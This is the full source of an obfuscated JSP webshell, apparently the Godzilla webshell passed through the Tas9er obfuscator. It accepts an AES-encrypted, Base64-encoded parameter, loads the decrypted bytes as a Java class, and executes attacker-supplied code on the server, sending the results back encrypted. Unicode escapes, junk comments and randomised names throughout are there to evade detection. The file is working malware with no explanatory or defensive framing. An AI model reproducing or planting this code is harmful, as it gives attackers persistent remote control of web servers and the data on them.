Hello Administrator!Welcome To Tas9er Godzilla JSP Console!
<%! String govsb_9nBNiPL = "59e3962a0b1e8a73";
    String govsb_BBm6uixwH = "Tas9er";
    class govsb_fhVCVNH4Kjq6 extends /*edusb_lg*/ClassLoader {
        public govsb_fhVCVNH4Kjq6(ClassLoader govsb_PTuwRAXeJuKOD07) {
            super/*edusb_QBIuiKxu179z*/(govsb_PTuwRAXeJuKOD07);
        }
        public Class govsb_pWu5(byte[] govsb_gQShxAKhw8l) {
            return super./*edusb_4ir*/\u0064\u0065\u0066\u0069\u006e\u0065\u0043\u006c\u0061\u0073\u0073/*edusb_CGEicnqXp0w*/(govsb_gQShxAKhw8l, 735067-735067, govsb_gQShxAKhw8l.length);
        }
    }
    public byte[] govsb_f2claP7MQSKG(byte[] govsb_vj3yeR8Hnbt0, boolean govsb_rY77G) {
        try {
            j\u0061\u0076\u0061\u0078./*edusb_7leCvt*/\u0063\u0072\u0079\u0070\u0074\u006f.Cipher govsb_iAc2hQiO = j\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.Cipher.\u0067\u0065\u0074\u0049\u006e\u0073\u0074\u0061\u006e\u0063e/*edusb_udY993NoBv*/("AES");
            govsb_iAc2hQiO.init(govsb_rY77G?735067/735067:735067/735067+735067/735067,new j\u0061\u0076\u0061\u0078.\u0063\u0072\u0079\u0070\u0074\u006f.spec./*edusb_kguD94n1N*/SecretKeySpec/*edusb_y579tCCcDrPd2IR*/(govsb_9nBNiPL.getBytes(), "AES"));
            return govsb_iAc2hQiO.doFinal/*edusb_2fbUoVgZxr9Vt92*/(govsb_vj3yeR8Hnbt0);
        } catch (Exception e) {
            return null;
        }
     }
    %><%
    try {
        byte[] govsb_CXSM6qdD9Wrv = java.util.Base64./*edusb_qcr2fxoV*/\u0067\u0065\u0074\u0044\u0065\u0063\u006f\u0064\u0065\u0072()./*edusb_m3siX5*/decode(request.getParameter(govsb_BBm6uixwH));
        govsb_CXSM6qdD9Wrv = govsb_f2claP7MQSKG(govsb_CXSM6qdD9Wrv,false);
        if (session.getAttribute/*edusb_rymwo*/("payload") == null) {
            session.setAttribute("payload", new govsb_fhVCVNH4Kjq6(this.\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073()./*edusb_MvdBrcMllT1qe4*/\u0067\u0065\u0074\u0043\u006c\u0061\u0073\u0073Loader())/*edusb_2Dp*/.govsb_pWu5(govsb_CXSM6qdD9Wrv));
        } else {
            request.setAttribute("parameters", govsb_CXSM6qdD9Wrv);
            java.io.ByteArrayOutputStream govsb_pxo = new java.io./*edusb_1cVInQztJ*/ByteArrayOutputStream();
            Object govsb_jcYim5b6MPgSpAO = /*edusb_k01NOyT1R*/((Class) session.getAttribute("payload"))./*edusb_TZJliXZMMWMe*//*edusb_A4eKPtYK2*/new\u0049\u006e\u0073\u0074\u0061\u006e\u0063\u0065()/*edusb_WakZ*/;
            govsb_jcYim5b6MPgSpAO.equals(govsb_pxo);
            govsb_jcYim5b6MPgSpAO.equals(pageContext);
            response.getWriter().write("5F3BE3B727E75662E142D7EC3F9DF875".substring(735067-735067, 16));
            govsb_jcYim5b6MPgSpAO.toString();
            response.getWriter().write(java.util.Base64/*edusb_jn2TRv6Cy*/.getEncoder()/*edusb_ccjr*/.encodeToString(govsb_f2claP7MQSKG(govsb_pxo.toByteArray(),true)));
            response.getWriter().write("5F3BE3B727E75662E142D7EC3F9DF875".substring(16));
        }
    } catch (Exception e) {
    }
%>
